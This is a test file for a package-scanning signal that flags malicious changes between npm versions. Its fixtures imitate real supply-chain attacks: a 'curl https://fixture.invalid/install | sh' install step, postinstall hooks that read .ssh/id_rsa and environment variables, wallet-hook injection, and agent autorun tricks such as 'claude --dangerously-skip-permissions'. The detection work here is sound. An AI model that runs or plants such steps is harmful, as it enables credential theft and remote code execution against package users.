import { test } from 'node:test';
import assert from 'node:assert/strict';
import { CodeDiffSignal } from '../src/modules/analysis/signals/code-diff.signal.js';
import { SEVERITY_WEIGHT, type AnalysisContext, type FileMap, type VersionManifest } from '../src/modules/analysis/signal.js';

const manifest = (version: string, scripts?: Record<string, string>): VersionManifest => ({
  name: 'fixture', version, scripts, dist: { tarball: 'https://fixture.invalid/package.tgz' },
});
const files = (entries: Record<string, string | Uint8Array>): FileMap => new Map(
  Object.entries(entries).map(([path, value]) => [path, typeof value === 'string' ? Buffer.from(value) : value]),
);
function context(target: FileMap, baseline: FileMap = new Map(),
  scripts?: Record<string, string>, oldScripts?: Record<string, string>): AnalysisContext {
  return { name: 'fixture', target: manifest('2.0.0', scripts), baseline: [manifest('1.0.0', oldScripts)], time: {},
    loadFiles: async version => version === '2.0.0' ? target : baseline };
}
const signal = new CodeDiffSignal();
const obfuscated = '// benign fixture\n' + '_0xabcdef;'.repeat(25);
const diverse = Array.from({ length: 90 }, (_, index) => String.fromCharCode(33 + index)).join('');

test('chalk-like changed code combining wallet hooks and obfuscation is critical', async () => {
  const result = await signal.evaluate(context(files({ 'index.js': `${obfuscated}\nwindow.ethereum.request; XMLHttpRequest.prototype.open; window.fetch = fixture;` }),
    files({ 'index.js': 'export {};' })));
  assert.ok(result.some(finding => finding.severity === 'critical' && finding.weight === 70));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('index.js:'))));
});

test('unchanged suspicious code and removed files produce no findings', async () => {
  const code = `${obfuscated} window.ethereum`;
  assert.deepEqual(await signal.evaluate(context(files({ 'index.js': code }), files({ 'index.js': code, 'removed.js': 'eval(fixture)' }))), []);
});

test('nx-like telemetry referenced by a new postinstall is critical', async () => {
  const result = await signal.evaluate(context(files({
    'telemetry.js': "// fixture strings only\nrequire('child_process'); Object.keys(process.env); .ssh/id_rsa; claude --dangerously-skip-permissions; api.github.com/user/repos; .bashrc",
  }), new Map(), { postinstall: 'node ./telemetry.js' }));
  assert.ok(result.length >= 4);
  assert.ok(result.every(finding => finding.severity === 'critical'));
});

test('keyv-like new preinstall and packed companion payload are detected', async () => {
  const result = await signal.evaluate(context(files({
    'setup.mjs': `${obfuscated}\nimport cp from 'node:child_process'; cp.execFileSync(fixture); github.com/oven-sh/bun/releases; .claude/settings.json SessionStart .vscode/tasks.json folderOpen`,
    'Math_Symbol.js': diverse.repeat(8500),
  }), new Map(), { preinstall: 'node setup.mjs' }));
  assert.ok(result.some(finding => finding.severity === 'critical'));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('packed-payload'))));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('agent-autorun'))));
});

test('package.json-only dependency changes do not produce code-diff findings', async () => {
  assert.deepEqual(await signal.evaluate(context(files({ 'package.json': '{"dependencies":{"fixture":"2"}}', 'index.js': 'export {};' }),
    files({ 'package.json': '{"dependencies":{"fixture":"1"}}', 'index.js': 'export {};' }))), []);
});

test('load failures return one informational finding', async () => {
  for (const version of ['1.0.0', '2.0.0']) {
    const ctx = context(new Map());
    ctx.loadFiles = async requested => { if (requested === version) throw new Error('fixture unavailable'); return new Map(); };
    assert.deepEqual(await signal.evaluate(ctx), [{ signal: 'code-diff', severity: 'info',
      title: 'code comparison unavailable: fixture unavailable', evidence: [], weight: 0 }]);
  }
});

test('first release scanning uses a lower severity and the contract weight', async () => {
  const ctx = context(files({ 'index.js': 'JSON.stringify(process.env)' }));
  ctx.baseline = [];
  const result = await signal.evaluate(ctx);
  assert.equal(result[0].severity, 'warn');
  assert.equal(result[0].weight, 15);
});

test('new non-JS install entry points, native builds and binary payloads are scanned', async () => {
  const result = await signal.evaluate(context(files({
    'setup.sh': 'curl https://fixture.invalid/install | sh',
    'binding.gyp': '{}',
    'payload.bin': Uint8Array.from({ length: 320 * 1024 }, (_, index) => index % 256),
    'disguised.js': Uint8Array.from({ length: 320 * 1024 }, (_, index) => index % 256),
    '.claude/settings.json': '{}',
    '.vscode/tasks.json': '{}',
  }), new Map(), { install: 'sh "./setup.sh"' }));
  assert.ok(result.some(finding => finding.severity === 'critical'));
  for (const id of ['native-install', 'packed-payload', 'agent-autorun']) {
    assert.ok(result.some(finding => finding.evidence.some(item => item.includes(id))), id);
  }
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('disguised.js:1 [packed-payload]'))));
});

test('existing install script does not escalate a changed file to critical', async () => {
  const result = await signal.evaluate(context(files({ 'setup.js': 'Object.keys(process.env)' }), files({ 'setup.js': 'export {};' }),
    { postinstall: 'node setup.js' }, { postinstall: 'node setup.js' }));
  assert.equal(result[0].severity, 'high');
});

test('new large minified JS and oversized files are reported without oversized scanning', async () => {
  const result = await signal.evaluate(context(files({
    'bundle.min.js': 'a'.repeat(501 * 1024),
    'huge.js': `eval(fixture);${'a'.repeat(8 * 1024 * 1024)}`,
  })));
  assert.ok(result.some(finding => finding.severity === 'high'));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('large-minified-file'))));
  assert.ok(result.some(finding => finding.evidence.some(item => item.includes('oversized-file'))));
  assert.ok(!result.some(finding => finding.evidence.some(item => item.includes('[eval]'))));
});

test('aggregation caps evidence per category and keeps critical evidence visible', async () => {
  const entries = Object.fromEntries(Array.from({ length: 8 }, (_, index) => [`file${index}.js`, 'eval(fixture)']));
  entries['last.js'] = 'eval(fixture)';
  const result = await signal.evaluate(context(files(entries), new Map(), { postinstall: 'node last.js' }));
  assert.equal(result.length, 1);
  assert.equal(result[0].severity, 'critical');
  assert.equal(result[0].evidence.length, 5);
  assert.ok(result[0].evidence[0].startsWith('last.js:'));
  for (const finding of result) assert.equal(finding.weight, SEVERITY_WEIGHT[finding.severity]);
});
